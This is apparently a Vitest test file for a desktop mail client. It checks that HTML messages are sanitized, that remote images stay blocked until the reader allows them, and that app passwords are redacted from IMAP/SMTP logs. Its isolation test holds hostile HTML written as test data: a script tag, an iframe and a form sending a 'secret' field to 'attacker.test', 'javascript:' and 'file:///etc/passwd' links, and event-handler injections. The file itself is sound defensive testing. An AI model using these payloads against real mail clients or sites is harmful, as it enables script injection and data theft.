import { act, cleanup, render } from '@testing-library/react'
import { createElement } from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { GmailTransport } from '../src/main/mail/gmail'
import HtmlMessage from '../src/renderer/src/components/mail/HtmlMessage'
import { startGmailImapServer, type GmailLoopbackServer } from './helpers/gmail-imap-server'

class Observer {
  observe(): void {}
  disconnect(): void {}
}

let server: GmailLoopbackServer | null
let transport: GmailTransport | null

beforeEach(() => {
  Object.assign(globalThis, { ResizeObserver: Observer, IS_REACT_ACT_ENVIRONMENT: true })
  server = null
  transport = null
})

afterEach(async () => {
  cleanup()
  if (transport) await transport.close().catch(() => {})
  if (server) await server.close()
  vi.restoreAllMocks()
})

async function draw(html: string): Promise<HTMLIFrameElement> {
  const view = render(createElement(HtmlMessage, { html, text: '' }))
  return view.container.querySelector('iframe') as HTMLIFrameElement
}

describe('mail message isolation', () => {
  it('removes executable elements, event handlers, embedded pages, and unsafe links', async () => {
    const frame = await draw(`
      <script>window.stolen = true</script>
      <iframe src="https://attacker.test"></iframe>
      <object data="https://attacker.test/file"></object>
      <form action="https://attacker.test"><input name="secret"><button>Send</button></form>
      <a id="script" href="javascript:alert(1)" onclick="alert(2)">Bad</a>
      <a id="file" href="file:///etc/passwd">File</a>
      <p id="copy" onmouseover="alert(3)" srcdoc="bad">Safe words</p>
    `)
    const source = frame.getAttribute('srcdoc') ?? ''
    const parsed = new DOMParser().parseFromString(source, 'text/html')

    expect(parsed.querySelector('script, iframe, object, form, input, button')).toBeNull()
    expect(parsed.querySelector('#script')?.hasAttribute('href')).toBe(false)
    expect(parsed.querySelector('#file')?.hasAttribute('href')).toBe(false)
    expect(parsed.querySelector('#copy')?.hasAttribute('onmouseover')).toBe(false)
    expect(parsed.querySelector('#copy')?.hasAttribute('srcdoc')).toBe(false)
    expect(parsed.body.textContent).toContain('Safe words')
    expect(source).toContain(`default-src 'none'`)
    expect(source).toContain(`connect-src 'none'`)
    expect(source).toContain(`frame-src 'none'`)
  })

  it('blocks remote images until the reader asks to show them', async () => {
    const frame = await draw(`
      <img src="https://track.example/pixel.gif" srcset="https://track.example/large.gif 2x">
      <img src="http://images.example/photo.jpg">
      <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==">
    `)
    const blocked = frame.getAttribute('srcdoc') ?? ''
    const hidden = new DOMParser().parseFromString(blocked, 'text/html')
    const images = [...hidden.querySelectorAll('img')]

    expect(images[0].hasAttribute('src')).toBe(false)
    expect(images[0].hasAttribute('srcset')).toBe(false)
    expect(images[0].dataset.remoteSrc).toBe('https://track.example/pixel.gif')
    expect(images[1].hasAttribute('src')).toBe(false)
    expect(images[2].getAttribute('src')).toMatch(/^data:/)
    expect(blocked).toContain(`img-src data: blob:`)
    expect(blocked).not.toContain(`img-src data: blob: http: https:`)
    expect(document.querySelector('button')?.textContent).toContain('Show 2 images')

    await act(async () => document.querySelector('button')?.click())
    const shown = frame.getAttribute('srcdoc') ?? ''
    expect(shown).toMatch(/img-src [^;]*http: https:/)
    expect(shown).toContain('src="https://track.example/pixel.gif"')
    expect(document.querySelector('button')?.textContent).toContain('Hide images')
  })

  it('routes web and mail links through the main-process bridge', async () => {
    const openExternal = vi.fn(async () => true)
    Object.assign(window, { crew: { openExternal } })
    const frame = await draw('<a href="https://crew.test/read">Read</a><a href="mailto:ali@example.com">Write</a>')
    const document = frame.contentDocument!
    document.body.innerHTML = '<a id="web" href="https://crew.test/read">Read</a><a id="mail" href="mailto:ali@example.com">Write</a><a id="local" href="#inside">Inside</a>'

    await act(async () => {
      document.querySelector('#web')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
      document.querySelector('#mail')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
      document.querySelector('#local')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    })

    expect(openExternal.mock.calls).toEqual([['https://crew.test/read'], ['mailto:ali@example.com']])
  })
})

describe('mail credential secrecy', () => {
  it('keeps app passwords out of protocol histories and returned mail data', async () => {
    const password = 'secret app pass 1'
    server = await startGmailImapServer({
      id: 'private',
      email: 'private@gmail.com',
      password,
      messages: [
        {
          from: 'Ali <ali@example.com>',
          to: 'private@gmail.com',
          subject: 'Private note',
          text: 'Only the message belongs in this result.'
        }
      ]
    })
    transport = new GmailTransport({
      auth: { user: 'private@gmail.com', pass: password },
      imap: { host: '127.0.0.1', port: server.imapPort, secure: false, startTLS: false },
      smtp: { host: '127.0.0.1', port: server.smtpPort, secure: false, startTLS: false },
      connectionTimeoutMs: 2_000
    })
    await transport.connect()
    const mailboxes = await transport.listMailboxes()
    const messages = await transport.fetchSummaries('INBOX', { uids: [1] })
    await transport.send({ to: 'ali@example.com', subject: 'Reply', text: 'Safe' })

    const observable = JSON.stringify({
      mailboxes,
      messages,
      imapCommands: server.imapCommands,
      smtpCommands: server.smtpCommands,
      smtpMessages: server.smtpMessages
    })
    expect(observable).not.toContain(password)
    expect(observable).not.toContain(Buffer.from(`\0private@gmail.com\0${password}`).toString('base64'))
    expect(server.imapCommands.some(command => command.includes('[redacted]'))).toBe(true)
    expect(server.smtpCommands.some(command => command.includes('[redacted]'))).toBe(true)
  })
})
